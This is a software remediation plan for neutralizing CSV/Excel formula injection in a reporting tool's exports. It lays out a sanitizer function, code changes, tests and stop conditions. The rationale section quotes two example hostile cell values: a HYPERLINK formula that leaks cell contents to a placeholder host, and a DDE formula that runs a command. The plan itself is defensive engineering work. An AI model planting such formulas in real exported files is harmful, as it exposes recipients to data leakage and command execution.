# Plan 007: Neutralize Excel/CSV formula injection in all user-data exports

> **Executor instructions**: Follow this plan step by step. Run every
> verification command and confirm the expected result before moving to the
> next step. If anything in the "STOP conditions" section occurs, stop and
> report — do not improvise. When done, update the status row for this plan
> in `plans/README.md`.
>
> **Drift check (run first)**: `git diff --stat e0950c4..HEAD -- core/report_generator.py core/balanced_export.py`
> If any in-scope file changed since this plan was written, compare the
> "Current state" excerpts against the live code before proceeding; on a
> mismatch, treat it as a STOP condition.

## Status

- **Priority**: P1
- **Effort**: S
- **Risk**: LOW
- **Depends on**: none
- **Category**: security
- **Planned at**: commit `e0950c4`, 2026-06-10

## Why this matters

Entity names, dimension values, and category labels from input CSVs are written verbatim into the Excel workbooks and balanced CSVs this tool produces — and those outputs are explicitly intended to be shared (auditors, BI teams, publication). A cell value like `=HYPERLINK("http://evil/?"&A1)` or `=cmd|'/c calc'!A0` in an input CSV becomes a live formula when a recipient opens the output in Excel (classic CSV/Excel injection). There is currently no sanitization layer: `_excel_safe_value` only JSON-encodes collections, and CSV exports call `DataFrame.to_csv` directly.

## Current state

- `core/report_generator.py:453-456` — the only "safety" hook, which does not neutralize formulas:

```python
def _excel_safe_value(self, value: Any) -> Any:
    if isinstance(value, (list, tuple, dict)):
        return json.dumps(value)
    return value
```

- `core/report_generator.py:366-368` and `:423-425` — cell-by-cell writes of DataFrame values into worksheets (`worksheet.cell(row=..., column=..., value=value)`); the second site already routes through `_excel_safe_value`.
- `core/report_generator.py:355-358` and `:380-390` — dict/metadata writes (`worksheet[f'B{row}'] = value`) that do **not** route through `_excel_safe_value`.
- `core/balanced_export.py:397` and `:546` — `export_df.to_csv(csv_output, index=False)` with `Dimension`/`Category`/entity-derived string columns straight from input data.
- Untrusted-string columns: anything originating from the input CSV — entity names (`issuer_name` etc.), dimension column values (categories), time-period values if string-typed. Numeric metric columns are floats and not at risk.
- Repo conventions: NumPy-style docstrings, `logger = logging.getLogger(__name__)`, type hints on public functions.

## Commands you will need

| Purpose | Command | Expected on success |
|---------|---------|---------------------|
| New tests | `py -m pytest tests/test_export_sanitization.py -q` | all pass |
| Full suite | `py -m pytest tests/ -q` | all pass |
| Gate | `py scripts/perform_gate_test.py` | exit 0 |
| CSV cross-check | `py utils/csv_validator.py <gate rate xlsx> <gate rate csv> --verbose` | pass (run inside gate) |
| Typecheck | `py -m mypy core/ utils/` | exit 0 |

## Scope

**In scope**:
- `core/export_sanitizer.py` (create — the sanitizer's home, see Step 1)
- `core/report_generator.py`
- `core/balanced_export.py`
- `tests/test_export_sanitization.py` (create)

**Out of scope**:
- `core/data_loader.py` — sanitize at the **output** boundary, not ingestion; entity names must round-trip exactly for matching/analysis (entity names are case-sensitive keys throughout).
- `utils/csv_validator.py` — but see STOP conditions: the validator joins CSV rows to Excel rows on category/entity strings; sanitization must not break that join.
- Audit log JSON (`core/audit_log.py`) — JSON is not an Excel-interpreted format.

## Git workflow

- Branch: `advisor/007-export-sanitization`
- Commit message style: `fix: neutralize formula injection in exports`
- Do NOT push or open a PR unless instructed.

## Steps

### Step 1: Implement the sanitizer

Create a tiny new module `core/export_sanitizer.py` holding a module-level `sanitize_cell(value)` (this is the decided home — it avoids any circular-import question and both `core/report_generator.py` and `core/balanced_export.py` import from it):

```python
_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")

def sanitize_cell(value: Any) -> Any:
    """Neutralize Excel formula injection for untrusted string cells."""
    if isinstance(value, str) and value.startswith(_FORMULA_PREFIXES):
        return "'" + value
    return value
```

Important nuance: numeric values arrive as `int`/`float`, never strings, so negative numbers are unaffected. A *string* beginning with `-` (e.g. a category literally named `-discount`) gets prefixed — acceptable and standard practice (OWASP guidance).

### Step 2: Apply in the Excel writer

In `core/report_generator.py`:
- `_excel_safe_value` calls `sanitize_cell` after its collection handling.
- Route the DataFrame write at lines 366-368 through `self._excel_safe_value(value)` (it currently writes raw).
- Route the dict writes at lines 355-358 and the metadata writes at 380-390 through `self._excel_safe_value(...)` for the value side (keys are internal config names — low risk, but routing them too is harmless and simpler).
- Search the file for other raw cell assignments of data-derived strings: `rg -n "worksheet\.cell|worksheet\[f" core/report_generator.py` and check each — sheet titles (`A1` headers) are internal literals and can stay; publication-path per-cell writes around lines 857-870 must be routed.

**Verify**: `py -m pytest tests/ -q` → all pass (no behavior change for normal data, since gate fixture values don't start with formula characters).

### Step 3: Apply in the CSV exporter

In `core/balanced_export.py`, before each `to_csv` call (lines 397 and 546, plus any other `to_csv` in the file — `rg -n "to_csv" core/balanced_export.py`), sanitize the object-dtype columns:

```python
for col in export_df.select_dtypes(include="object").columns:
    export_df[col] = export_df[col].map(sanitize_cell)
export_df.to_csv(csv_output, index=False)
```

### Step 4: Tests

Create `tests/test_export_sanitization.py`:
1. Unit: `sanitize_cell("=HYPERLINK(...)") == "'=HYPERLINK(...)"`; same for `+`, `-`, `@`, tab prefixes; `sanitize_cell("BANCO SANTANDER")` unchanged; `sanitize_cell(12.5)` unchanged; `sanitize_cell(-3)` unchanged (int passes through).
2. Integration: copy `tests/fixtures/gate_demo.csv` to `tmp_path`, rename one category value to `=2+5` — concretely, replace every occurrence of the `channel` value `Online` with `=2+5` in the CSV text (all rows, so the category stays consistent across entities/periods), run a share analysis via `core.analysis_run.execute_share_run` (pattern: `tests/test_analysis_run_integration.py` from plan 003 if it exists; otherwise `benchmark.run_share_analysis` as in `tests/test_output_artifacts.py`) with `export_balanced_csv=True`. Assert:
   - No cell in the output workbook's dimension sheets has a value starting with `=` (iterate with `openpyxl.load_workbook(...).worksheets`, checking `cell.value` for strings starting with `=`; note `data_only=False` so a real formula would show as `=`).
   - The balanced CSV contains `'=2+5` and not a bare `=2+5` at line start of any field.

**Verify**: `py -m pytest tests/test_export_sanitization.py -q` → all pass.

### Step 5: Full verification

**Verify**: `py -m pytest tests/ -q` → all pass; `py scripts/perform_gate_test.py` → exit 0 (the gate cross-validates CSV against Excel — both sides sanitized identically, so the join must still match).

## Test plan

See Step 4. Pattern files: `tests/test_output_artifacts.py` for run invocation, plan 003's integration test if landed.

## Done criteria

- [ ] `sanitize_cell` exists, is used by both the Excel writer and the CSV exporter
- [ ] Malicious-category integration test passes (no raw `=`-prefixed strings in outputs)
- [ ] `py -m pytest tests/ -q` exits 0
- [ ] `py scripts/perform_gate_test.py` exits 0 (CSV↔Excel cross-validation intact)
- [ ] `py -m mypy core/ utils/` exits 0
- [ ] `plans/README.md` status row updated

## STOP conditions

- The gate's CSV↔Excel cross-validation fails after sanitization — that means the validator compares a sanitized value on one side with an unsanitized one on the other, or sanitization was applied asymmetrically. Fix the asymmetry (sanitize both writers identically); if the validator itself normalizes values in a way that breaks, report instead of editing `utils/csv_validator.py`.
- Sanitizing entity names breaks an exact-match lookup somewhere downstream of export (it shouldn't — exports are terminal) — report where.
- A circular import arises even with the standalone `core/export_sanitizer.py` module (it should import nothing from `core/`) — report.

## Maintenance notes

- Any **new** export path (JSON output if later wired, new sheets) must route strings through `sanitize_cell` — reviewers should watch for raw `to_csv`/`worksheet.cell` additions.
- The leading-quote convention is Excel-specific; if a future consumer chokes on `'=...`, consider the space-prefix variant — but change it in one place only.
- Residual gap accepted this round: `add_data_quality_sheet` (`core/report_generator.py:602-605`) writes validation-message strings raw — message text is tool-generated, lower risk; flagged for a follow-up, do not expand scope to it here.
